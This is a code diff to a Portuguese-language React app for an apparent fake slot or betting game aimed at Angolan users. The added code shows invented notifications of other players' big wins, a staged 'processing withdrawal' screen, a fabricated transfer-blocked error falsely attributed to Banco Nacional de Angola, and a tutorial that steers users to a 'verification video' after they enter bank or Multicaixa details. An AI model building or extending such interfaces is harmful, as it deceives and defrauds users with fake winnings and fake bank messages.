@@ -15,7 +15,7 @@ export const Route = createFileRoute("/")({
   component: Index,
 });
 
-type Step = "landing" | "register" | "success" | "game" | "win" | "withdraw" | "multicaixa" | "iban" | "verifying" | "verified" | "video";
+type Step = "landing" | "register" | "success" | "game" | "win" | "withdraw" | "multicaixa" | "iban" | "verifying" | "verified" | "processing" | "blocked" | "tutorial" | "video";
 
 function Index() {
   const [step, setStep] = useState<Step>("landing");
@@ -53,7 +53,10 @@ function Index() {
         {step === "multicaixa" && <Multicaixa onBack={() => setStep("withdraw")} onConfirm={(v) => startVerify("multicaixa", v)} />}
         {step === "iban" && <Iban onBack={() => setStep("withdraw")} onConfirm={(v) => startVerify("iban", v)} />}
         {step === "verifying" && <Verifying onDone={() => setStep("verified")} />}
-        {step === "verified" && <Verified amount={winnings} method={method} onContinue={() => setStep("video")} />}
+        {step === "verified" && <Verified amount={winnings} method={method} onContinue={() => setStep("processing")} />}
+        {step === "processing" && <Processing method={method} amount={winnings} onDone={() => setStep("blocked")} />}
+        {step === "blocked" && <Blocked amount={winnings} method={method} onContinue={() => setStep("tutorial")} />}
+        {step === "tutorial" && <Tutorial onContinue={() => setStep("video")} />}
         {step === "video" && <VideoStep />}
       </div>
     </div>
@@ -276,10 +279,33 @@ function Game({ onFinish }: { onFinish: (amount: number) => void }) {
   const [grid, setGrid] = useState<string[]>(() => Array(9).fill("🎆"));
   const [spinning, setSpinning] = useState(false);
   const [result, setResult] = useState<null | { win: boolean; amount: number }>(null);
+  const [notifs, setNotifs] = useState<{ id: number; win: boolean; user: string; amount: number }[]>([]);
   const spinRef = useRef<number | null>(null);
+  const notifId = useRef(0);
+
+  const pushNotif = (win: boolean, user: string, amount: number) => {
+    const id = ++notifId.current;
+    setNotifs((n) => [...n, { id, win, user, amount }]);
+    setTimeout(() => setNotifs((n) => n.filter((x) => x.id !== id)), 4200);
+  };
+
+  // Fake live notifications from other players
+  useEffect(() => {
+    const users = ["@maria_f", "@joao_k", "@ana_l", "@carlos_m", "@sofia_d", "@pedro_a", "@bruna_r", "@tiago_n"];
+    const id = window.setInterval(() => {
+      const win = Math.random() < 0.7;
+      const user = users[Math.floor(Math.random() * users.length)];
+      const amount = win
+        ? Math.floor(8000 + Math.random() * 110000)
+        : Math.floor(1000 + Math.random() * 5000);
+      pushNotif(win, user, amount);
+    }, 3800);
+    return () => clearInterval(id);
+  }, []);
 
   const max = 10;
   const remaining = max - rounds;
+
 
   useEffect(() => {
     if (rounds >= max) {
@@ -318,10 +344,38 @@ function Game({ onFinish }: { onFinish: (amount: number) => void }) {
     setRounds((r) => r + 1);
     setResult({ win: isWin, amount });
     setSpinning(false);
+    pushNotif(isWin, "Você", isWin ? amount : bet);
   };
 
   return (
-    <div className="flex flex-1 flex-col">
+    <div className="relative flex flex-1 flex-col">
+      <div className="pointer-events-none fixed inset-x-0 top-3 z-50 mx-auto flex max-w-md flex-col items-center gap-2 px-3">
+        {notifs.map((n) => (
+          <div
+            key={n.id}
+            className={`pointer-events-none w-full max-w-xs rounded-xl border px-3 py-2 text-sm shadow-card backdrop-blur-md animate-[slideIn_.3s_ease-out] ${
+              n.win
+                ? "border-success/40 bg-success/15 text-success"
+                : "border-danger/40 bg-danger/15 text-danger"
+            }`}
+          >
+            <div className="flex items-center gap-2">
+              <span className="text-lg">{n.win ? "🎉" : "💸"}</span>
+              <div className="flex-1 leading-tight">
+                <div className="font-bold">
+                  {n.user} {n.win ? "ganhou" : "perdeu"}
+                </div>
+                <div className="text-xs opacity-90">
+                  {n.win ? "+" : "-"}
+                  {n.amount.toLocaleString("pt-PT")} Kz
+                </div>
+              </div>
+            </div>
+          </div>
+        ))}
+      </div>
+      <style>{`@keyframes slideIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}`}</style>
+
       <div className="flex items-center justify-between gap-3 pt-2">
         <Stat label="RODADAS" value={`${rounds}/10`} />
         <div className="text-center">
@@ -626,6 +680,175 @@ function Verified({
         </div>
         <div className="mt-5">
           <PrimaryButton onClick={onContinue}>💰 Levantar meus ganhos agora</PrimaryButton>
+        </div>
+      </Card>
+    </div>
+  );
+}
+
+/* ---------- Processing / Blocked / Tutorial ---------- */
+
+function Processing({
+  method,
+  amount,
+  onDone,
+}: {
+  method: { type: "iban" | "multicaixa"; value: string };
+  amount: number;
+  onDone: () => void;
+}) {
+  const [progress, setProgress] = useState(0);
+  useEffect(() => {
+    const start = Date.now();
+    const duration = 4200;
+    const id = window.setInterval(() => {
+      const p = Math.min(100, ((Date.now() - start) / duration) * 100);
+      setProgress(p);
+      if (p >= 100) {
+        clearInterval(id);
+        setTimeout(onDone, 250);
+      }
+    }, 80);
+    return () => clearInterval(id);
+  }, [onDone]);
+
+  const r = 54;
+  const c = 2 * Math.PI * r;
+  const dash = (progress / 100) * c;
+
+  return (
+    <div className="flex flex-1 items-center">
+      <Card className="w-full">
+        <div className="relative mx-auto h-40 w-40">
+          <svg viewBox="0 0 128 128" className="h-full w-full -rotate-90">
+            <circle cx="64" cy="64" r={r} stroke="oklch(1 0 0 / 0.12)" strokeWidth="10" fill="none" />
+            <circle
+              cx="64" cy="64" r={r}
+              stroke="url(#g)" strokeWidth="10" fill="none" strokeLinecap="round"
+              strokeDasharray={`${dash} ${c}`}
+            />
+            <defs>
+              <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
+                <stop offset="0%" stopColor="oklch(0.88 0.18 90)" />
+                <stop offset="100%" stopColor="oklch(0.72 0.2 55)" />
+              </linearGradient>
+            </defs>
+          </svg>
+          <div className="absolute inset-0 flex items-center justify-center text-3xl font-extrabold text-gold">
+            {Math.floor(progress)}%
+          </div>
+        </div>
+        <h2 className="mt-5 text-center text-xl font-extrabold text-gold">Processando Saque...</h2>
+        <p className="mt-1 text-center text-sm text-muted-foreground">Conectando ao servidor bancário...</p>
+
+        <div className="mt-5 space-y-3 rounded-2xl border border-border bg-card/60 p-4 text-sm">
+          <Row label="Método" value={method.type === "multicaixa" ? "Multicaixa Express" : "IBAN"} />
+          <Row label="Destino" value={method.value} />
+          <Row label="Valor" value={`${amount.toLocaleString("pt-PT")} Kz`} />
+        </div>
+      </Card>
+    </div>
+  );
+}
+
+function Row({ label, value }: { label: string; value: string }) {
+  return (
+    <div className="flex items-center justify-between">
+      <span className="text-muted-foreground">{label}</span>
+      <span className="font-bold text-gold">{value}</span>
+    </div>
+  );
+}
+
+function Blocked({
+  amount,
+  method,
+  onContinue,
+}: {
+  amount: number;
+  method: { type: "iban" | "multicaixa"; value: string };
+  onContinue: () => void;
+}) {
+  return (
+    <div className="flex flex-1 items-center">
+      <Card className="w-full">
+        <div className="text-center text-5xl">⚠️</div>
+        <h2 className="mt-3 text-center text-2xl font-extrabold text-danger">Falha na Transferência</h2>
+        <p className="mt-1 text-center text-xs text-muted-foreground">
+          Código de erro: <span className="font-bold text-foreground">#TRF-4092</span>
+        </p>
+
+        <div className="mt-5 rounded-2xl border border-danger/40 bg-danger/10 p-4 text-sm leading-relaxed">
+          <span className="font-bold text-danger">Erro detectado:</span> A transferência de{" "}
+          <span className="font-bold">{amount.toLocaleString("pt-PT")} Kz</span> para{" "}
+          <span className="font-bold">{method.value}</span> via{" "}
+          <span className="font-bold text-gold">
+            {method.type === "multicaixa" ? "Multicaixa Express" : "IBAN"}
+          </span>{" "}
+          foi bloqueada pelo sistema de segurança bancária por suspeita de actividade automatizada (bot).
+          É necessário verificar a identidade do titular para liberar o pagamento.
+        </div>
+
+        <div className="mt-4 space-y-3 rounded-2xl border border-border bg-card/60 p-4 text-sm">
+          <Row label="Status" value="BLOQUEADO" />
+          <Row label="Método" value={method.type === "multicaixa" ? "Multicaixa Express" : "IBAN"} />
+          <Row label="Destino" value={method.value} />
+          <Row label="Valor Retido" value={`${amount.toLocaleString("pt-PT")} Kz`} />
+        </div>
+
+        <div className="mt-4 rounded-2xl border border-success/30 bg-success/10 p-4 text-xs leading-relaxed">
+          <span className="font-bold text-success">🛡 Este bloqueio</span> é uma medida de segurança do{" "}
+          <span className="font-bold">Banco Nacional de Angola</span> para proteger a sua conta. Resolva
+          na próxima etapa para liberar o saque.
+        </div>
+
+        <div className="mt-5">
+          <PrimaryButton onClick={onContinue}>👉 Ver como desbloquear meu saque</PrimaryButton>
+        </div>
+      </Card>
+    </div>
+  );
+}
+
+function Tutorial({ onContinue }: { onContinue: () => void }) {
+  const steps = [
+    { icon: "🎬", title: "Assista ao vídeo de verificação", text: "Reproduza o vídeo completo na próxima etapa. Ele confirma que você é um titular real." },
+    { icon: "🔐", title: "Verificação automática", text: "Ao terminar o vídeo, o sistema valida a sua identidade junto ao banco em poucos segundos." },
+    { icon: "💸", title: "Receba o seu saque", text: "Com a identidade confirmada, o bloqueio é removido e o valor cai na sua conta." },
+  ];
+  return (
+    <div className="flex flex-1 items-center">
+      <Card className="w-full">
+        <h2 className="text-center text-2xl font-extrabold text-gold">Como liberar o seu saque</h2>
+        <p className="mt-1 text-center text-sm text-muted-foreground">
+          Siga os 3 passos abaixo para desbloquear o pagamento
+        </p>
+
+        <ol className="mt-5 space-y-3">
+          {steps.map((s, i) => (
+            <li key={i} className="flex gap-4 rounded-2xl border border-border bg-card/70 p-4">
+              <div className="flex h-12 w-12 shrink-0 items-center justify-center rounded-xl bg-gold/15 text-2xl">
+                {s.icon}
+              </div>
+              <div>
+                <div className="flex items-center gap-2">
+                  <span className="rounded-full bg-gold/20 px-2 py-0.5 text-xs font-bold text-gold">
+                    Passo {i + 1}
+                  </span>
+                  <span className="font-bold">{s.title}</span>
+                </div>
+                <p className="mt-1 text-sm text-muted-foreground">{s.text}</p>
+              </div>
+            </li>
+          ))}
+        </ol>
+
+        <div className="mt-5 rounded-2xl border border-gold/30 bg-gold/10 p-3 text-center text-xs">
+          ⚡ Processo 100% seguro · Conclua em menos de 2 minutos
+        </div>
+
+        <div className="mt-5">
+          <PrimaryButton onClick={onContinue}>▶ Assistir vídeo e desbloquear</PrimaryButton>
         </div>
       </Card>
     </div>
